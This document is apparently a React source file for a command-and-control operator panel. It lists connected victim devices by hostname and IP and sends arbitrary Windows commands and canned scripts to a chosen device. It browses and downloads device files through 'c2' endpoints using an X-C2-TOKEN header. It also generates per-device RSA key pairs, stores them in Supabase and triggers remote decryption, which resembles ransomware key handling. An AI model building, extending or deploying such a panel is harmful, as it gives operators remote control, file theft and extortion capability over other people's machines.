import { useEffect, useMemo, useRef, useState } from 'react'
import { initSocket } from './socketClient'
import { supabase } from './lib/supabase'
import './modern.css'

export default function FreshUI() {
  const DEFAULT_RAW = import.meta.env.VITE_API_BASE || 'http://localhost:8080/api'
  const [host, setHost] = useState(DEFAULT_RAW.replace(/\/$/, ''))
  const API_BASE = useMemo(() => `${host}/py_simple`, [host])

  const [activeTab, setActiveTab] = useState('devices')
  const [socketStatus, setSocketStatus] = useState('disconnected')
  const socketRef = useRef(null)

  const [devices, setDevices] = useState([])
  const [selectedToken, setSelectedToken] = useState('')
  const [connectedCount, setConnectedCount] = useState(0)
  const [systemOnline, setSystemOnline] = useState(false)
  const [status, setStatus] = useState('')
  const [loading, setLoading] = useState(false)

  // Keys
  const [publicKey, setPublicKey] = useState('')
  const [privateKey, setPrivateKey] = useState('')
  const [userId, setUserId] = useState('')

  // Scripts
  const [scripts, setScripts] = useState([]) // [{id, label, command}]
  const [selectedScripts, setSelectedScripts] = useState({}) // map by id -> true

  // Terminal
  const [command, setCommand] = useState('')

  // Files
  const [files, setFiles] = useState([]) // [{name, is_dir, size}]
  const [c2Path, setC2Path] = useState('') // '' means root
  const [c2Token, setC2Token] = useState('') // optional X-C2-TOKEN

  useEffect(() => {
    try {
      socketRef.current = initSocket({
        apiBase: API_BASE,
        onStatus: (st) => setSocketStatus(st),
        onAck: () => {},
        startDeviceOnConnect: true,
      })
    } catch (_) {}
    return () => { try { socketRef.current?.disconnect() } catch (_) {} }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [API_BASE])

  useEffect(() => {
    refreshAll()
    const id = setInterval(refreshAll, 5000)
    return () => clearInterval(id)
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [API_BASE])

  async function refreshAll() {
    await Promise.allSettled([
      refreshDevices(),
      refreshScripts(),
      refreshFiles(),
    ])
  }

  async function refreshDevices() {
    try {
      const res = await fetch(`${API_BASE}/devices`)
      if (!res.ok) throw new Error('devices')
      const data = await res.json()
      const list = data.devices || []
      setDevices(list)
      setConnectedCount(list.filter(d => d.connected).length)
      setSystemOnline(true)
      if (list.length && !selectedToken) setSelectedToken(list[0].token)
    } catch (_) { setSystemOnline(false) }
  }

  async function refreshScripts() {
    try {
      const res = await fetch(`${API_BASE}/scripts`)
      if (!res.ok) throw new Error('scripts')
      const data = await res.json()
      setScripts(Array.isArray(data?.scripts) ? data.scripts : [])
    } catch (_) {
      setScripts([
        { id: 'scriptA', label: 'Script A', command: 'echo Script A' },
        { id: 'scriptB', label: 'Script B', command: 'echo Script B' },
        { id: 'scriptC', label: 'Script C', command: 'echo Script C' },
      ])
    }
  }

  async function refreshFiles() {
    try {
      const headers = c2Token ? { 'X-C2-TOKEN': c2Token } : undefined
      let res, data
      if (!c2Path) {
        res = await fetch(`${API_BASE}/c2`, { headers })
        if (!res.ok) throw new Error('files')
        data = await res.json()
        setFiles(Array.isArray(data?.files) ? data.files : [])
      } else {
        const url = new URL(`${API_BASE}/c2/list`, window.location.origin)
        url.searchParams.set('path', c2Path)
        res = await fetch(url, { headers })
        if (!res.ok) throw new Error('files')
        data = await res.json()
        setFiles(Array.isArray(data?.files) ? data.files : [])
      }
    } catch (_) { setFiles([]) }
  }

  // Actions
  async function generateKeys() {
    try {
      setLoading(true); setStatus('')
      const res = await fetch(`${API_BASE}/keys/rsa`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({}) })
      const data = await res.json()
      if (!res.ok) throw new Error(data?.error || `HTTP ${res.status}`)
      setPublicKey(data.public_key_pem || '')
      setPrivateKey(data.private_key_pem || '')
      setStatus('Key pair generated')
      // Auto-save to Supabase if configured and user provided
      if (userId && selectedToken) {
        await saveKeysToSupabase({ userId, token: selectedToken, pub: data.public_key_pem, prv: data.private_key_pem })
      }
    } catch (e) { setStatus(`Key generation failed: ${e}`) } finally { setLoading(false) }
  }

  async function sendPublicKey() {
    if (!selectedToken || !publicKey) { setStatus('Select a device and generate a public key first'); return }
    try {
      setLoading(true)
      const res = await fetch(`${API_BASE}/devices/${selectedToken}/keys`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ public_key_pem: publicKey }) })
      if (!res.ok) { const d = await res.json().catch(()=>({})); throw new Error(d?.error || `HTTP ${res.status}`) }
      setStatus('Public key stored on server for device')
      await refreshDevices()
      if (userId) {
        await saveKeysToSupabase({ userId, token: selectedToken, pub: publicKey, prv: null })
      }
    } catch (e) { setStatus(`Send failed: ${e}`) } finally { setLoading(false) }
  }

  async function decryptWithPrivateKey() {
    if (!selectedToken || !privateKey) { setStatus('Select a device and generate a private key first'); return }
    try {
      setLoading(true)
      // Attach private key then trigger decrypt
      await fetch(`${API_BASE}/devices/${selectedToken}/keys`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ private_key_pem: privateKey }) }).catch(()=>{})
      if (socketRef.current && socketStatus === 'connected') {
        socketRef.current.emit('site_decrypt', { token: selectedToken })
      } else {
        await fetch(`${API_BASE}/decrypt`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: selectedToken }) })
      }
      setStatus('Decrypt triggered')
      if (userId) {
        await saveKeysToSupabase({ userId, token: selectedToken, pub: null, prv: privateKey })
      }
    } catch (e) { setStatus(`Decrypt failed: ${e}`) } finally { setLoading(false) }
  }

  async function runSelectedScripts() {
    if (!selectedToken) { setStatus('Select a device'); return }
    const chosen = scripts.filter(s => selectedScripts[s.id])
    if (!chosen.length) { setStatus('Select at least one script'); return }
    setLoading(true)
    try {
      for (const s of chosen) {
        if (socketRef.current && socketStatus === 'connected') {
          socketRef.current.emit('site_run', { token: selectedToken, command: s.command })
        } else {
          await fetch(`${API_BASE}/device/run`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: selectedToken, command: s.command }) })
        }
      }
      setStatus('Scripts dispatched')
    } catch (e) { setStatus(`Script run failed: ${e}`) } finally { setLoading(false) }
  }

  async function executeCommand() {
    if (!selectedToken || !command.trim()) { setStatus('Select a device and enter a command'); return }
    try {
      setLoading(true)
      const res = await fetch(`${API_BASE}/device/run`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: selectedToken, command }) })
      const data = await res.json().catch(()=>({}))
      if (!res.ok) throw new Error(data?.error || `HTTP ${res.status}`)
      setStatus(data?.status || 'Command sent')
    } catch (e) { setStatus(`Command failed: ${e}`) } finally { setLoading(false) }
  }

  const deviceNames = devices.map(d => ({ label: `${d.hostname || d.token.slice(0,8)} • ${d.ip || 'ip?'} • ${d.connected ? 'online' : 'offline'}`, value: d.token }))

  const filesWithPaths = files.map(f => ({
    ...f,
    // compute relative path for downloads
    relPath: (c2Path ? `${c2Path.replace(/\/+$/, '')}/` : '') + (f.name || ''),
  }))

  return (
    <div className="ui-root">
      <header className="ui-header">
        <div className="brand">
          <div className="logo">⚡</div>
          <div>
            <div className="title">Control Center</div>
            <div className="subtitle">Fresh, fast, and sleek</div>
          </div>
        </div>
        <div className="header-right">
          <div className="stat-chip"><span className="dot" style={{background: connectedCount>0?'#10b981':'#ef4444'}}></span>{connectedCount} online</div>
          <div className="stat-chip">Socket: {socketStatus}</div>
          <div className="host-input">
            <input value={host} onChange={(e)=>setHost(e.target.value.replace(/\/$/, ''))} placeholder="https://api.example.com" />
          </div>
          <div className="host-input">
            <input value={userId} onChange={(e)=>setUserId(e.target.value)} placeholder="User ID (for Supabase)" />
          </div>
        </div>
      </header>

      <main className="ui-main">
        <aside className="ui-sidebar">
          <button className={`tab-btn ${activeTab==='devices'?'active':''}`} onClick={()=>setActiveTab('devices')}>Devices</button>
          <button className={`tab-btn ${activeTab==='keys'?'active':''}`} onClick={()=>setActiveTab('keys')}>Keys</button>
          <button className={`tab-btn ${activeTab==='scripts'?'active':''}`} onClick={()=>setActiveTab('scripts')}>Scripts</button>
          <button className={`tab-btn ${activeTab==='terminal'?'active':''}`} onClick={()=>setActiveTab('terminal')}>Terminal</button>
          <button className={`tab-btn ${activeTab==='files'?'active':''}`} onClick={()=>setActiveTab('files')}>Files</button>
        </aside>

        <section className="ui-content">
          {/* Overview strip */}
          <div className="stats">
            <div className="card stat">
              <div className="label">System</div>
              <div className={`value ${systemOnline?'ok':'warn'}`}>{systemOnline ? 'Online' : 'Offline'}</div>
            </div>
            <div className="card stat">
              <div className="label">Devices</div>
              <div className="value">{connectedCount} connected</div>
            </div>
            <div className="card stat">
              <div className="label">Socket</div>
              <div className="value">{socketStatus}</div>
            </div>
          </div>

          {activeTab === 'devices' && (
            <div className="panel card">
              <div className="panel-title">Devices</div>
              <div className="grid two">
                <div>
                  <label className="field-label">Select device</label>
                  <select className="input" value={selectedToken} onChange={(e)=>setSelectedToken(e.target.value)}>
                    <option value="">Choose a device</option>
                    {deviceNames.map(d => (<option key={d.value} value={d.value}>{d.label}</option>))}
                  </select>
                </div>
                <div className="actions-end">
                  <button className="btn" onClick={refreshDevices}>Refresh</button>
                </div>
              </div>
              <div className="muted" style={{marginTop:8}}>Tip: devices refresh every 5 seconds automatically.</div>
            </div>
          )}

          {activeTab === 'keys' && (
            <div className="panel card">
              <div className="panel-title">RSA Key Management</div>
              <div className="actions">
                <button className="btn primary" disabled={loading} onClick={generateKeys}>Generate Keys</button>
                <button className="btn" disabled={loading || !publicKey || !selectedToken} onClick={sendPublicKey}>Send Public Key</button>
                <button className="btn danger" disabled={loading || !privateKey || !selectedToken} onClick={decryptWithPrivateKey}>Decrypt with Private Key</button>
                <button className="btn" disabled={!userId || !selectedToken || (!publicKey && !privateKey)} onClick={()=>saveKeysToSupabase({ userId, token: selectedToken, pub: publicKey || null, prv: privateKey || null }).then(()=>setStatus('Saved to Supabase')).catch(e=>setStatus('Save failed: '+e.message))}>Save to Supabase</button>
                <button className="btn" disabled={!userId || !selectedToken} onClick={async()=>{ try { const rec = await loadKeysFromSupabase({ userId, token: selectedToken }); if (rec) { setPublicKey(rec.public_key_pem || ''); setPrivateKey(rec.private_key_pem || ''); setStatus('Loaded from Supabase') } else { setStatus('No keys found for user/device') } } catch(e){ setStatus('Load failed: '+e.message) } }}>Load from Supabase</button>
              </div>
              <div className="grid two" style={{marginTop:12}}>
                <div>
                  <label className="field-label">Public Key</label>
                  <textarea className="input mono" rows={10} placeholder="Public key will appear here" value={publicKey} onChange={(e)=>setPublicKey(e.target.value)} />
                </div>
                <div>
                  <label className="field-label">Private Key</label>
                  <textarea className="input mono" rows={10} placeholder="Private key will appear here" value={privateKey} onChange={(e)=>setPrivateKey(e.target.value)} />
                </div>
              </div>
            </div>
          )}

          {activeTab === 'scripts' && (
            <div className="panel card">
              <div className="panel-title">Scripts</div>
              <div className="script-grid">
                {scripts.map(s => (
                  <label key={s.id} className={`script card ${selectedScripts[s.id]?'checked':''}`}>
                    <input type="checkbox" checked={!!selectedScripts[s.id]} onChange={(e)=>setSelectedScripts(prev=>({...prev, [s.id]: e.target.checked}))} />
                    <div className="script-name">{s.label || s.id}</div>
                    <div className="script-cmd">{s.command}</div>
                  </label>
                ))}
              </div>
              <div className="actions">
                <button className="btn primary" disabled={loading || !selectedToken} onClick={runSelectedScripts}>Run Selected</button>
              </div>
            </div>
          )}

          {activeTab === 'terminal' && (
            <div className="panel card">
              <div className="panel-title">Terminal</div>
              <label className="field-label">Command</label>
              <input className="input" placeholder="Enter Windows command..." value={command} onChange={(e)=>setCommand(e.target.value)} />
              <div className="actions">
                <button className="btn primary" disabled={loading || !selectedToken || !command.trim()} onClick={executeCommand}>Execute</button>
              </div>
            </div>
          )}

          {activeTab === 'files' && (
            <div className="panel card">
              <div className="panel-title">Files</div>
              <div className="grid two" style={{alignItems:'end'}}>
                <div>
                  <label className="field-label">Path</label>
                  <input className="input" value={c2Path} onChange={(e)=>setC2Path(e.target.value.replace(/^\/+|\/+$/g, ''))} placeholder="" />
                </div>
                <div>
                  <label className="field-label">C2 Token (optional)</label>
                  <input className="input" value={c2Token} onChange={(e)=>setC2Token(e.target.value)} placeholder="X-C2-TOKEN" />
                </div>
              </div>
              <div className="actions">
                <button className="btn" onClick={refreshFiles}>Refresh</button>
                {!!c2Path && <button className="btn" onClick={()=>{ setC2Path(''); setTimeout(refreshFiles, 0) }}>Root</button>}
              </div>
              {files.length === 0 && <div className="muted">No files found.</div>}
              <div className="file-list">
                {filesWithPaths.map(f => (
                  f.is_dir ? (
                    <button key={f.relPath} className="file-row" onClick={()=>{ setC2Path(f.relPath); setTimeout(refreshFiles, 0) }}>
                      <span className="file-name">📁 {f.name}</span>
                      <span className="file-size">dir</span>
                    </button>
                  ) : (
                    <a key={f.relPath} className="file-row" href={`${API_BASE}/c2/download?path=${encodeURIComponent(f.relPath)}`} target="_blank" rel="noreferrer">
                      <span className="file-name">📄 {f.name}</span>
                      <span className="file-size">{f.size ? `${f.size} bytes` : ''}</span>
                    </a>
                  )
                ))}
              </div>
            </div>
          )}

          {status && <div className="toast" role="status">{status}</div>}
        </section>
      </main>
    </div>
  )
}

async function saveKeysToSupabase({ userId, token, pub, prv }) {
  if (!supabase) return
  const payload = { user_id: userId, device_token: token, public_key_pem: pub ?? null, private_key_pem: prv ?? null }
  const { error } = await supabase.from('device_keys').upsert(payload, { onConflict: 'user_id,device_token' })
  if (error) throw error
}

async function loadKeysFromSupabase({ userId, token }) {
  if (!supabase) return null
  const { data, error } = await supabase
    .from('device_keys')
    .select('public_key_pem, private_key_pem')
    .eq('user_id', userId)
    .eq('device_token', token)
    .limit(1)
    .maybeSingle()
  if (error) throw error
  return data
}
